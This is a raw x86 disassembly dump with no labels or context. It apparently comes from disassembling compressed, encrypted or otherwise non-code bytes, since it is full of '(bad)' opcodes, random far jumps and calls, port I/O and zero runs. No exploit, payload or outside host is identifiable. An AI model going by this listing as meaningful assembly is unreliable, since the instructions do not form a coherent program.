  4215eb:	xor    ebx,DWORD PTR [edi-0x55]
  4215ee:	mov    bl,cl
  4215f0:	or     dh,ah
  4215f2:	xchg   ebp,eax
  4215f3:	and    al,0x8d
  4215f5:	loope  0x4215ab
  4215f7:	aas    
  4215f8:	mov    ds:0xa9c859f7,al
  4215fd:	dec    esi
  4215fe:	mov    ds:0x12b656cb,eax
  421603:	ins    BYTE PTR es:[edi],dx
  421604:	mov    esp,0x9591a531
  421609:	or     eax,0x4501f47c
  42160e:	add    al,0xc1
  421610:	imul   edi,DWORD PTR [ebx],0xa17a9bd3
  421616:	mov    eax,?
  421618:	inc    ebx
  421619:	mov    edx,0xb47c1426
  42161e:	sahf   
  42161f:	sbb    bl,BYTE PTR [ecx]
  421621:	sbb    al,0xd2
  421623:	(bad)  
  421624:	repnz or al,0x55
  421627:	fsubrp st(1),st
  421629:	sub    BYTE PTR [edx+0x7ceaae49],0x58
  421630:	jle    0x4215ed
  421632:	(bad)  
  421633:	aam    0x2f
  421635:	jl     0x4215dc
  421637:	js     0x421677
  421639:	sub    al,0x1
  42163b:	xchg   DWORD PTR [ecx+0x63],ebx
  42163e:	into   
  42163f:	sbb    ch,BYTE PTR [eax]
  421641:	push   ecx
  421642:	jp     0x42169d
  421644:	(bad)  
  421645:	mov    BYTE PTR [ecx-0x4d193893],0x59
  42164c:	dec    edx
  42164d:	cdq    
  42164e:	jp     0x421622
  421650:	inc    edi
  421651:	sub    eax,0xa7715f3a
  421656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421657:	pop    eax
  421658:	outs   dx,BYTE PTR ds:[esi]
  421659:	outs   dx,BYTE PTR ds:[esi]
  42165a:	xchg   edx,eax
  42165b:	adc    DWORD PTR [edi+0x15efcba4],esp
  421661:	test   eax,0x75adefec
  421666:	out    0xdc,al
  421668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421669:	xchg   ecx,eax
  42166a:	imul   esi,DWORD PTR [esi-0x66],0x175a3270
  421671:	xchg   ebx,eax
  421672:	adc    ah,BYTE PTR [eax+0x62a7a155]
  421678:	inc    esi
  421679:	lods   al,BYTE PTR ds:[esi]
  42167a:	or     al,cl
  42167c:	jnp    0x42166f
  42167e:	call   0x839c119c
  421683:	fs xor al,0x28
  421686:	test   al,0x83
  421688:	icebp  
  421689:	cmp    bh,bh
  42168b:	bound  edi,QWORD PTR [ebx+0x46]
  42168e:	jns    0x42169e
  421690:	out    dx,al
  421691:	or     ebx,esi
  421693:	sbb    eax,DWORD PTR [ebx+0x69]
  421696:	push   0xffffffaf
  421698:	sub    DWORD PTR [ecx+0x77b8192c],ecx
  42169e:	addr16 inc ebp
  4216a0:	jno    0x421661
  4216a2:	scas   eax,DWORD PTR es:[edi]
  4216a3:	cmp    eax,0x5b628d13
  4216a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216a9:	sub    ecx,ebx
  4216ab:	dec    ebp
  4216ac:	fcmovne st,st(6)
  4216ae:	push   ss
  4216af:	lods   al,BYTE PTR ds:[esi]
  4216b0:	icebp  
  4216b1:	sar    BYTE PTR [ebp+0x621a5405],cl
  4216b7:	xor    eax,0xbb2bc765
  4216bc:	lods   al,BYTE PTR ds:[esi]
  4216bd:	jns    0x421663
  4216bf:	rcl    ecx,0x29
  4216c2:	dec    edx
  4216c3:	pop    eax
  4216c4:	imul   eax,esi,0xfdda3f8e
  4216ca:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4216cc:	push   edx
  4216cd:	(bad)  
  4216ce:	push   esp
  4216cf:	lods   al,BYTE PTR ds:[esi]
  4216d0:	cmp    eax,0xf1342390
  4216d5:	ins    DWORD PTR es:[edi],dx
  4216d6:	add    eax,0x108a7344
  4216db:	sbb    al,0xd1
  4216dd:	jmp    0x421751
  4216df:	mov    ah,0xa7
  4216e1:	out    dx,eax
  4216e2:	add    ah,dh
  4216e4:	popf   
  4216e5:	dec    ebp
  4216e6:	outs   dx,BYTE PTR ds:[esi]
  4216e7:	xchg   edi,eax
  4216e8:	mov    esi,0xb57ac10d
  4216ed:	and    cl,ch
	...
  4216f7:	add    BYTE PTR [eax],al
  4216f9:	add    BYTE PTR [eax],ah
  4216fb:	push   ss
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	not    BYTE PTR [ebx]
  421707:	loop   0x4216ba
  421709:	mov    al,0xf0
  42170b:	xchg   edx,eax
  42170c:	add    DWORD PTR [eax],eax
  42170e:	std    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [edx+0x4ec9c2bc],ah
  421717:	and    al,BYTE PTR [edi+0x16003fbc]
  42171d:	jle    0x421708
  42171f:	or     ch,BYTE PTR ds:0xa22ea9d1
  421725:	ins    BYTE PTR es:[edi],dx
  421726:	mov    al,0x8f
  421728:	call   0x995e13d6
  42172d:	inc    ebp
  42172e:	push   eax
  42172f:	dec    edx
  421730:	std    
  421731:	stos   BYTE PTR es:[edi],al
  421732:	leave  
  421733:	mov    ecx,0x99d63b99
  421738:	inc    ebp
  421739:	stos   DWORD PTR es:[edi],eax
  42173a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42173b:	push   0x881aeab
  421740:	es push ds
  421742:	mov    ebx,0x5219abd1
  421747:	adc    BYTE PTR [edi-0x25],bl
  42174a:	mov    cl,0x5b
  42174c:	leave  
  42174d:	popf   
  42174e:	call   0x92f5:0x662b71cc
  421755:	jbe    0x4216e7
  421757:	cmp    eax,0xa5f6db1f
  42175c:	aas    
  42175d:	sar    DWORD PTR [esi+0x1d],1
  421760:	mov    ah,0xd2
  421762:	jae    0x421794
  421764:	push   cs
  421765:	je     0x421791
  421767:	push   edx
  421768:	or     eax,0xb82d50a4
  42176d:	mov    WORD PTR [ebx-0x31],es
  421770:	fwait
  421771:	mov    ebp,0xa00e0c2b
  421776:	xchg   cl,al
  421778:	cmp    eax,0x7b8b73c1
  42177d:	stos   BYTE PTR es:[edi],al
  42177e:	cdq    
  42177f:	jg     0x421760
  421781:	mov    ebx,0x6233eca7
  421786:	mov    ch,0x3
  421788:	lods   al,BYTE PTR ds:[esi]
  421789:	(bad)  
  42178a:	(bad)  
  42178b:	fcom   QWORD PTR [ecx+0xe6685f]
  421791:	fwait
  421792:	dec    ecx
  421793:	(bad)  
  421794:	and    ah,BYTE PTR [ebp+esi*2-0xa0835fb]
  42179b:	and    al,0x17
  42179d:	ret    
  42179e:	cmp    ebx,DWORD PTR [edx+0x5f12806d]
  4217a4:	or     al,0x35
  4217a6:	(bad)  
  4217a7:	stc    
  4217a8:	test   al,0x10
  4217aa:	xor    ah,BYTE PTR [edx+ebx*2+0x49f89eaf]
  4217b1:	or     edi,DWORD PTR [ecx+0x38]
  4217b4:	inc    ecx
  4217b5:	sbb    eax,0xa296dbc5
  4217ba:	jne    0x42181a
  4217bc:	mov    edx,0x7707e09e
  4217c1:	adc    al,0xb7
  4217c3:	adc    eax,0x57db0f63
  4217c8:	clc    
  4217c9:	pop    ebx
  4217ca:	xchg   esi,eax
  4217cb:	mov    ch,ch
  4217cd:	pop    ecx
  4217ce:	push   ecx
  4217cf:	int    0x30
  4217d1:	inc    edx
  4217d2:	push   es
  4217d3:	(bad)  
  4217d5:	mov    ds:0xe8666a89,eax
  4217da:	xchg   esp,eax
  4217db:	cmp    bl,BYTE PTR [eax+0x7579c752]
  4217e1:	bt     DWORD PTR [esi+0x29],edx
  4217e5:	iret   
  4217e6:	xor    bl,BYTE PTR [esi]
  4217e8:	out    0x2,eax
  4217ea:	jecxz  0x421845
  4217ec:	(bad)  
  4217ed:	push   edx
  4217ee:	inc    ebp
  4217ef:	adc    ebx,DWORD PTR [ebp-0x37f271be]
  4217f5:	sub    dh,bh
  4217f7:	sub    eax,0x941be8e0
  4217fc:	bound  ebx,QWORD PTR [eax+0x69]
  4217ff:	sub    DWORD PTR [ebx+0x2],ecx
  421802:	daa    
  421803:	mov    eax,ds:0x8ba7a39c
  421808:	fwait
  421809:	aas    
  42180a:	(bad)  
  42180b:	push   ecx
  42180c:	push   ds
  42180d:	xchg   edi,eax
  42180e:	adc    DWORD PTR [ebx+0x36d2c918],ebp
  421814:	push   ebx
  421815:	lock sub al,0xf
  421818:	or     eax,0x7fa5bb0
  42181d:	cmp    dl,dl
  42181f:	add    ah,BYTE PTR [edi-0x48]
  421822:	icebp  
  421823:	jmp    0xc392:0x6e5a2177
  42182a:	cmp    al,0xe5
  42182c:	fcomp  QWORD PTR [edi+ecx*1-0x225fb3ad]
  421833:	loop   0x4218a4
  421835:	xor    DWORD PTR [esp+eiz*4-0x23],0xc8d558f5
  42183d:	sbb    eax,0x767b316b
  421842:	std    
  421843:	xchg   ebp,eax
  421844:	pop    esi
  421845:	sbb    cl,bh
  421847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421848:	jae    0x421831
  42184a:	sub    al,0xcc
  42184c:	mov    eax,0x8933719c
  421851:	add    ebx,DWORD PTR [ecx]
  421853:	ins    BYTE PTR es:[edi],dx
  421854:	mov    bl,BYTE PTR [ebx]
  421856:	pop    ecx
  421857:	jp     0x4217f4
  421859:	fcmovnb st,st(6)
  42185b:	push   ds
  42185c:	fsubr  DWORD PTR [eax]
  42185e:	dec    ebp
  42185f:	sub    bl,BYTE PTR [edx]
  421861:	add    al,0x93
  421863:	cmp    BYTE PTR [eax],bl
  421865:	cdq    
  421866:	dec    ebp
  421867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421868:	sub    esp,ebx
  42186a:	mov    edx,0xd4cd6452
  42186f:	dec    edi
  421870:	ja     0x42182f
  421872:	push   esp
  421873:	sub    bl,0x80
  421876:	cmp    DWORD PTR [ecx],0x30
  421879:	or     al,0x27
  42187b:	add    dl,BYTE PTR [ebx+0x242347ca]
  421881:	test   eax,0xf0704e53
  421886:	out    dx,eax
  421887:	mov    dh,0x98
  421889:	ss cmp eax,0x4980e3f9
  42188f:	pop    edi
  421890:	xor    eax,0x41c1fe46
  421895:	jmp    0xc15ba195
  42189a:	xlat   BYTE PTR ds:[ebx]
  42189b:	adc    edi,esp
  42189d:	scas   eax,DWORD PTR es:[edi]
  42189e:	mov    cl,dl
  4218a0:	bswap  edx
  4218a2:	and    DWORD PTR [ebp-0x636daf6a],ebp
  4218a8:	mov    dl,0xe8
  4218aa:	mov    WORD PTR [ebx+edx*8],?
  4218ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218af:	cmc    
  4218b0:	add    DWORD PTR [eax],0x78dd3e7e
  4218b6:	nop
  4218b7:	enter  0xd8a0,0xc2
  4218bb:	test   eax,0xcdaea5dc
  4218c0:	cmp    edx,DWORD PTR [edi-0x5279f916]
  4218c6:	inc    ecx
  4218c7:	mov    ah,0x3f
  4218c9:	mov    ebp,0x631f632c
  4218ce:	cmp    BYTE PTR [ebx+0x51],0x23
  4218d2:	push   esi
  4218d3:	or     DWORD PTR [edi+0x45],edi
  4218d6:	xor    DWORD PTR [ebx],edi
  4218d8:	mov    ah,0x3d
  4218da:	add    DWORD PTR [esi-0x56],ecx
  4218dd:	push   ss
  4218de:	or     DWORD PTR [edx],0x96035242
  4218e4:	push   eax
  4218e5:	cmp    eax,0x273826ab
  4218ea:	enterw 0xca79,0x69
  4218ef:	push   ebx
  4218f0:	ret    
  4218f1:	data16 jb 0x4218f8
  4218f4:	test   ebp,ecx
  4218f6:	sbb    ebp,eax
  4218f8:	inc    ecx
  4218f9:	sti    
  4218fa:	mov    edx,0xc0b7cbbd
  421900:	jbe    0x42196a
  421902:	or     BYTE PTR [ecx+esi*4],ch
  421905:	dec    ecx
  421906:	ja     0x421986
  421908:	cli    
  421909:	shl    ecx,1
  42190b:	and    bh,BYTE PTR [edx]
  42190d:	inc    edx
  42190e:	cmp    eax,0x0
  421913:	add    BYTE PTR [eax],al
  421915:	add    BYTE PTR [eax],al
  421917:	add    BYTE PTR [eax],al
  421919:	add    BYTE PTR [eax-0x4456c5cd],dh
  42191f:	test   eax,0x428f3bb3
  421924:	mov    esp,0xb98e818a
  421929:	aad    0xed
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	std    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [ebp-0x21a3bbdf],bh
  421937:	std    
  421938:	pop    ss
  421939:	jae    0x4218f8
  42193b:	mov    BYTE PTR [ebp+0x3ee25d89],cl
  421941:	add    al,0x24
  421943:	cmp    DWORD PTR [eax-0x10],esp
  421946:	out    0xe3,al
  421948:	mov    esi,0x13e3dea2
  42194d:	add    DWORD PTR [edx+ecx*1-0xc],0xf2aafb45
  421955:	sbb    ebx,DWORD PTR [eax]
  421957:	adc    al,0x27
  421959:	icebp  
  42195a:	mov    ds:0x960034cd,al
  42195f:	xchg   edi,eax
  421960:	or     eax,0xe0950f49
  421965:	inc    ebx
  421966:	mov    ebx,0xc038b0aa
  42196b:	and    ebp,DWORD PTR [esi+0x11]
  42196e:	jno    0x421977
  421970:	js     0x4219a4
  421972:	jecxz  0x4219df
  421974:	(bad)  
  421975:	in     eax,0x62
  421977:	rcr    BYTE PTR [ebx],0xb5
  42197a:	rcl    DWORD PTR [edx],0xcb
  42197d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42197e:	dec    esi
  42197f:	rol    DWORD PTR [edi],cl
  421981:	mov    ah,0x6a
  421983:	mov    ecx,0xe3a3b0a3
  421988:	pop    esp
  421989:	dec    ebp
  42198a:	adc    BYTE PTR [eax],dl
  42198c:	xor    DWORD PTR [eax-0x3c],edx
  42198f:	enter  0x1269,0x73
  421993:	mov    ds:0x7e49799e,al
  421998:	fild   WORD PTR [esi-0x6d12d0b2]
  42199e:	xor    DWORD PTR [edi-0x28],0xc3091cd1
  4219a5:	mov    ecx,0xbfa18c0b
  4219aa:	push   eax
  4219ab:	sbb    al,0xf9
  4219ad:	test   al,0x53
  4219af:	inc    esi
  4219b0:	leave  
  4219b1:	sbb    eax,0x300e2ee5
  4219b6:	mov    esi,0xf0fef83e
  4219bb:	xchg   esp,eax
  4219bc:	pop    ds
  4219bd:	rol    BYTE PTR [ecx],1
  4219bf:	cmp    eax,0x180e71d3
  4219c4:	mov    ch,BYTE PTR [edx+ebp*2]
  4219c7:	mov    bh,0xcc
  4219c9:	call   0x51d6:0x8c2b47a3
  4219d0:	in     al,dx
  4219d1:	lahf   
  4219d2:	fisub  DWORD PTR [edx+0x253bc2f4]
  4219d8:	sbb    DWORD PTR [eax],esp
  4219da:	popa   
  4219db:	push   ss
  4219dc:	jge    0x4219d4
  4219de:	or     DWORD PTR [ebx-0x1444b0f6],ebx
  4219e4:	or     eax,0x4ace8502
  4219e9:	adc    cl,BYTE PTR [esi-0x31e904fd]
  4219ef:	cld    
  4219f0:	enter  0xca0d,0x61
  4219f4:	inc    ebp
  4219f5:	jne    0x4219b9
  4219f7:	fdivp  st(7),st
  4219f9:	and    BYTE PTR [eax*2+0x136020a2],bl
  421a00:	in     al,0x4f
  421a02:	ss adc bl,ah
  421a05:	mov    ebx,edi
  421a07:	int    0x9a
  421a09:	add    DWORD PTR [esi+0x1],edi
  421a0c:	sub    BYTE PTR [ebx+0x8],cl
  421a0f:	retf   
  421a10:	dec    edx
  421a11:	pop    ds
  421a12:	fiadd  DWORD PTR [eax]
  421a14:	loop   0x421a6f
  421a16:	or     dh,cl
  421a18:	inc    edx
  421a19:	xchg   edi,eax
  421a1a:	mov    al,ds:0x71eed7f9
  421a1f:	push   esp
  421a20:	cmp    DWORD PTR [ebp-0x4d],ebx
  421a23:	sti    
  421a24:	scas   eax,DWORD PTR es:[edi]
  421a25:	mov    dh,0xf3
  421a27:	or     eax,0x67f9499b
  421a2c:	add    al,BYTE PTR [eax-0x36]
  421a2f:	popa   
  421a30:	out    0x4e,eax
  421a32:	fwait
  421a33:	and    dh,bl
  421a35:	pop    ebp
  421a36:	mov    ebx,0xeffb994e
  421a3b:	fyl2xp1 
  421a3d:	mov    DWORD PTR [ebp+ebx*4-0x540cfa96],esi
  421a44:	jecxz  0x421a10
  421a46:	dec    ebx
  421a47:	pushfw 
  421a49:	pop    esi
  421a4a:	(bad)  
  421a4b:	std    
  421a4c:	mov    ds:0xdaa312e1,eax
  421a51:	xchg   esp,eax
  421a52:	adc    BYTE PTR [ebx],bh
  421a54:	cmp    bl,cl
  421a56:	arpl   WORD PTR [edx*1-0x79ec61f4],cx
  421a5d:	ret    
  421a5e:	and    eax,0xccdc84c4
  421a63:	sbb    DWORD PTR [edx-0x6f0bd9dd],eax
  421a69:	(bad)  
  421a6b:	jne    0x421a9e
  421a6d:	push   0xffffffd1
  421a6f:	add    eax,0x32e4b6dd
  421a74:	repz pop ds
  421a76:	out    0x70,al
  421a78:	sub    ah,dl
  421a7a:	jae    0x421a8c
  421a7c:	iret   
  421a7d:	lahf   
  421a7e:	lock mov edx,?
  421a81:	hlt    
  421a82:	pop    edi
  421a83:	and    esp,DWORD PTR [esi+esi*1-0x60]
  421a87:	gs sub bh,dl
  421a8a:	sbb    eax,0xa48c377b
  421a8f:	mov    al,0x75
  421a91:	mov    bl,BYTE PTR [edx-0x65]
  421a94:	sahf   
  421a95:	ror    BYTE PTR [eax+eax*2],0xce
  421a99:	jmp    0x42c7b4c7
  421a9e:	stc    
  421a9f:	lds    edi,FWORD PTR [edi]
  421aa1:	test   DWORD PTR [ebx-0x671ef575],edx
  421aa7:	arpl   WORD PTR [edi+0x1c],sp
  421aaa:	inc    ecx
  421aab:	jl     0x421a84
  421aad:	in     eax,dx
  421aae:	inc    edx
  421aaf:	sbb    edi,esi
  421ab1:	into   
  421ab2:	inc    ebx
  421ab3:	loope  0x421a3d
  421ab5:	mov    eax,0xecca9fb4
  421aba:	stos   DWORD PTR es:[edi],eax
  421abb:	mov    eax,ds:0x37b95806
  421ac0:	dec    ebx
  421ac1:	(bad)  
  421ac2:	aam    0xb5
  421ac4:	mov    dl,0xd2
  421ac6:	mov    cl,0x65
  421ac8:	mov    edx,0x35ac4722
  421acd:	into   
  421ace:	stos   BYTE PTR es:[edi],al
  421acf:	cli    
  421ad0:	int3   
  421ad1:	add    bh,ah
  421ad3:	les    esp,FWORD PTR [ebp+0x19e639df]
  421ad9:	lock fldcw WORD PTR [ebx-0x411a53fc]
  421ae0:	(bad)  
  421ae2:	adc    BYTE PTR [esi],ch
  421ae4:	cmp    BYTE PTR [eax+0x42532d5a],cl
  421aea:	jbe    0x421b06
  421aec:	xchg   edi,eax
  421aed:	test   al,dl
  421aef:	jp     0x421b3e
  421af1:	cmp    BYTE PTR [edi-0x6413f717],0x22
  421af8:	das    
  421af9:	pop    esp
  421afa:	mov    eax,0xc388a378
  421aff:	iret   
  421b00:	mov    edi,0x70c7fa30
  421b05:	jl     0x421aed
  421b07:	loope  0x421ada
  421b09:	cld    
  421b0a:	xchg   DWORD PTR es:[edi-0x6253c4b9],ecx
  421b11:	enter  0x6b5e,0xf7
  421b15:	mov    edi,0xd93fc38e
  421b1a:	inc    eax
  421b1b:	in     al,0x36
  421b1d:	ficom  DWORD PTR [edi+0x34]
  421b20:	add    al,0x60
  421b22:	or     bh,bl
  421b24:	pop    esp
  421b25:	lods   eax,DWORD PTR ds:[esi]
  421b26:	cli    
  421b27:	push   esp
  421b28:	mov    bh,0xd8
  421b2a:	sub    DWORD PTR [ecx+0x14],esi
  421b2d:	add    edx,ebx
	...
  421b37:	add    BYTE PTR [eax],al
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0xdad6f8f7
  421b48:	add    BYTE PTR [ecx+0x196ea],bh
  421b4e:	std    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    BYTE PTR [edx],bl
  421b53:	mov    edi,0x5ccc9217
  421b58:	pop    ecx
  421b59:	cdq    
  421b5a:	out    dx,eax
  421b5b:	inc    eax
  421b5c:	inc    edi
  421b5d:	or     al,0x23
  421b5f:	ss inc edx
  421b62:	pop    esi
  421b63:	pop    ss
  421b64:	add    cl,BYTE PTR [ecx]
  421b66:	dec    eax
  421b67:	xchg   edx,eax
  421b68:	lds    esp,FWORD PTR [edx+0x5ea4c1]
  421b6e:	dec    edi
  421b6f:	sti    
  421b70:	lods   al,BYTE PTR ds:[esi]
  421b71:	fcmove st,st(0)
  421b73:	add    BYTE PTR [edx],dh
  421b75:	xor    ecx,DWORD PTR ss:[ebx]
  421b78:	or     DWORD PTR [esp+eiz*2+0x0],ecx
  421b7c:	imul   eax,DWORD PTR [edx],0xffffffd4
  421b7f:	mov    dl,BYTE PTR [esi-0x25]
  421b82:	inc    eax
  421b83:	mov    edi,DWORD PTR [edi+0x410e915c]
  421b89:	retf   
  421b8a:	stos   BYTE PTR es:[edi],al
  421b8b:	jle    0x421b20
  421b8d:	sbb    eax,0x48b407b3
  421b92:	or     cl,cl
  421b94:	pop    edx
  421b95:	inc    edx
  421b96:	pop    ebx
  421b97:	lods   eax,DWORD PTR ds:[esi]
  421b98:	popa   
  421b99:	adc    edx,DWORD PTR [ebx+0x39]
  421b9c:	pop    ebx
  421b9d:	(bad)  [ecx]
  421b9f:	in     eax,dx
  421ba0:	push   esp
  421ba1:	xchg   edi,esi
  421ba3:	idiv   DWORD PTR [ebx]
  421ba5:	mov    ebp,0x1e49f98
  421baa:	mov    al,0x7f
  421bac:	(bad)  
  421bad:	mov    al,0x26
  421baf:	jmp    0x5b6b08c0
  421bb4:	jge    0x421b99
  421bb6:	(bad)  
  421bb7:	in     eax,dx
  421bb8:	ret    
  421bb9:	ja     0x421bd8
  421bbb:	nop
  421bbc:	dec    ecx
  421bbd:	adc    al,0xea
  421bbf:	add    al,0x8b
  421bc1:	adc    eax,0xc20eaaab
  421bc6:	xor    DWORD PTR [esi-0x34fc5dec],ebx
  421bcc:	aad    0x71
  421bce:	sbb    BYTE PTR [esi-0x46],0xde
  421bd2:	inc    ebp
  421bd3:	pushf  
  421bd4:	aaa    
  421bd5:	int3   
  421bd6:	int    0xc8
  421bd8:	nop
  421bd9:	xor    BYTE PTR fs:[ebp+0x29],bl
  421bdd:	xor    BYTE PTR [eax-0x46],ch
  421be0:	mov    ds:0xfeff94c5,al
  421be5:	sbb    BYTE PTR ds:0x60cd669a,bl
  421beb:	into   
  421bec:	imul   eax,DWORD PTR [eax+edi*1-0x71],0x47ad1801
  421bf4:	adc    DWORD PTR [ebx-0x361ecefa],esi
  421bfa:	xor    eax,0xfeee0916
  421bff:	xor    DWORD PTR [ebx+esi*4-0x5d],ecx
  421c03:	sub    BYTE PTR [edx],al
  421c05:	xchg   edi,eax
  421c06:	sbb    ebp,edi
  421c08:	lahf   
  421c09:	sbb    edi,ecx
  421c0b:	push   edi
  421c0c:	xchg   BYTE PTR [eax],cl
  421c0e:	shl    DWORD PTR [ebp-0x52],cl
  421c11:	mov    BYTE PTR [ebp+0x7e],0x75
  421c15:	pop    ds
  421c16:	shl    DWORD PTR [edx+0x1f],0x99
  421c1a:	mov    ebx,0xd46d8678
  421c1f:	and    DWORD PTR [ebx-0x394742e],eax
  421c25:	mov    DWORD PTR [edx+0x4589bb13],0x7117358b
  421c2f:	add    al,0x58
  421c31:	rcl    BYTE PTR [eax+ebx*1-0x21a1173b],1
  421c38:	ins    DWORD PTR es:[edi],dx
  421c39:	dec    edi
  421c3a:	popf   
  421c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c3c:	(bad)  
  421c3d:	fild   WORD PTR [edx+0x31]
  421c40:	mov    eax,0x21ddfc6c
  421c45:	leave  
  421c46:	into   
  421c47:	test   BYTE PTR [ebp+0x2d],al
  421c4a:	jmp    0xa100:0x248031f2
  421c51:	cmp    DWORD PTR [ebx],eax
  421c53:	push   ds
  421c54:	imul   esi,DWORD PTR [edx+0x6ec4af6d],0xbee3ffe1
  421c5e:	leave  
  421c5f:	fld    QWORD PTR [ebx+0x72f44958]
  421c65:	inc    eax
  421c66:	loop   0x421c1c
  421c68:	lds    ecx,FWORD PTR [edi]
  421c6a:	scas   al,BYTE PTR es:[edi]
  421c6b:	rcl    dl,0xad
  421c6e:	ret    0xb3b4
  421c71:	mov    ?,edi
  421c73:	jns    0x421c02
  421c75:	jl     0x421c41
  421c77:	dec    edx
  421c78:	push   ss
  421c79:	inc    esi
  421c7a:	fdiv   st,st(0)
  421c7c:	out    dx,al
  421c7d:	cld    
  421c7e:	(bad)  
  421c7f:	pop    edi
  421c80:	imul   esp,esp,0x72e1da4d
  421c86:	mov    dh,0xf
  421c88:	xlat   BYTE PTR ds:[ebx]
  421c89:	pop    ebx
  421c8a:	(bad)  
  421c8c:	ja     0x421c40
  421c8e:	sub    dl,BYTE PTR [edx]
  421c90:	jg     0x421c29
  421c92:	xchg   edi,eax
  421c93:	ror    bl,1
  421c95:	push   ebp
  421c96:	ins    DWORD PTR es:[edi],dx
  421c97:	sbb    BYTE PTR [edi],dh
  421c99:	fistp  QWORD PTR [edx+0x4983b58c]
  421c9f:	les    ebp,FWORD PTR [ecx+0x1]
  421ca2:	inc    esp
  421ca3:	lahf   
  421ca4:	adc    eax,0x134b99fd
  421ca9:	in     al,dx
  421caa:	mov    eax,0x72cd4a9f
  421caf:	dec    DWORD PTR [edi]
  421cb1:	adc    DWORD PTR [edi],ebx
  421cb3:	mov    eax,ds:0x519ca87e
  421cb8:	cwde   
  421cb9:	out    0xd9,eax
  421cbb:	mov    bh,0x22
  421cbd:	aaa    
  421cbe:	xchg   edx,eax
  421cbf:	mov    ebx,DWORD PTR [eax+0x3c2c0c97]
  421cc5:	push   cs
  421cc6:	not    DWORD PTR [esi]
  421cc8:	or     edi,DWORD PTR [edx+eax*1+0xfa57c2]
  421ccf:	push   ecx
  421cd0:	js     0x421c99
  421cd2:	(bad)  [edx+0x2cc23138]
  421cd8:	dec    eax
  421cd9:	xlat   BYTE PTR ds:[ebx]
  421cda:	aam    0x65
  421cdc:	bound  edx,QWORD PTR ds:0xa9182623
  421ce2:	mov    bl,0x69
  421ce4:	jne    0x421d05
  421ce6:	lods   eax,DWORD PTR ds:[esi]
  421ce7:	pop    esi
  421ce8:	jns    0x421d31
  421cea:	rol    bl,1
  421cec:	fcmovnbe st,st(3)
  421cee:	push   0xe9dcf777
  421cf3:	jb     0x421d34
  421cf5:	adc    eax,0x9c7b9540
  421cfa:	into   
  421cfb:	fwait
  421cfc:	or     eax,0xc376294e
  421d01:	paddusw mm3,QWORD PTR [eax]
  421d04:	dec    ebx
  421d05:	and    DWORD PTR [edi],eax
  421d07:	and    dl,BYTE PTR [ebx+esi*8]
  421d0a:	imul   ebp,DWORD PTR [esi-0x19],0x57
  421d0e:	pop    edx
  421d0f:	cmp    BYTE PTR [edi+0x24],bh
  421d12:	sub    al,0x7e
  421d14:	sub    eax,0x10c46c81
  421d19:	xor    DWORD PTR [esi+0x38f01cce],edi
  421d1f:	fiadd  DWORD PTR [ecx+0x57]
  421d22:	mov    eax,0xc889cf92
  421d27:	lods   eax,DWORD PTR ds:[esi]
  421d28:	push   ds
  421d29:	adc    DWORD PTR ds:0x413199ae,ecx
  421d2f:	test   al,0x43
  421d31:	aaa    
  421d32:	(bad)  
  421d33:	loop   0x421d26
  421d35:	sub    DWORD PTR [esi],edx
  421d37:	pop    ss
  421d38:	or     BYTE PTR [ecx-0x23],al
  421d3b:	cmp    DWORD PTR ds:0xba8b985a,esi
  421d41:	xchg   edx,eax
  421d42:	add    DWORD PTR [edx-0x1de1aa65],0x933257b1
  421d4c:	jns    0x421d84
  421d4e:	inc    edx
	...
  421d57:	add    BYTE PTR [eax],al
  421d59:	add    BYTE PTR [ebx+0x7d7539cf],bh
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	test   ch,0xa5
  421d69:	out    0x98,ax
  421d6c:	add    DWORD PTR [eax],eax
  421d6e:	std    
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [ecx+0x13dcd3ab],dl
  421d77:	unpcklps xmm7,XMMWORD PTR [edi+0x63]
  421d7b:	mov    ebp,0x41565533
  421d80:	sbb    al,0x75
  421d82:	retf   0x2e06
  421d85:	fcmovnu st,st(0)
  421d87:	push   esp
  421d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d89:	sbb    BYTE PTR [eax-0x57fe3934],dh
  421d8f:	stos   DWORD PTR es:[edi],eax
  421d90:	std    
  421d91:	in     eax,0x6
  421d93:	je     0x421d94
  421d95:	xchg   edx,eax
  421d96:	fs xchg edi,eax
  421d98:	mov    ecx,ecx
  421d9a:	mov    al,ds:0x49ae45dc
  421d9f:	js     0x421d84
  421da1:	les    eax,FWORD PTR [ebx-0x1d]
  421da4:	push   es
  421da5:	(bad)  
  421da6:	mov    ds:0xb09cf0c5,eax
  421dab:	inc    BYTE PTR [ebp+0x78]
  421dae:	ins    BYTE PTR es:[edi],dx
  421daf:	repnz add edi,DWORD PTR [esi+0x5e43e90d]
  421db6:	xor    al,0x89
  421db8:	(bad)  
  421db9:	repz jmp 0xa6d024a6
  421dbf:	sub    al,ah
  421dc1:	mov    eax,0x1503ff81
  421dc6:	sbb    eax,0x5bb59c2c
  421dcb:	mov    ebx,0xba59e6a6
  421dd0:	sub    dl,BYTE PTR [edi+0x9]
  421dd3:	fnstcw WORD PTR [edi-0x1c]
  421dd6:	lock call 0x7023:0xe0537054
  421dde:	inc    ebp
  421ddf:	push   ds
  421de0:	int    0x3d
  421de2:	fs mov bl,0xee
  421de5:	mov    ds:0x9c4dd39e,al
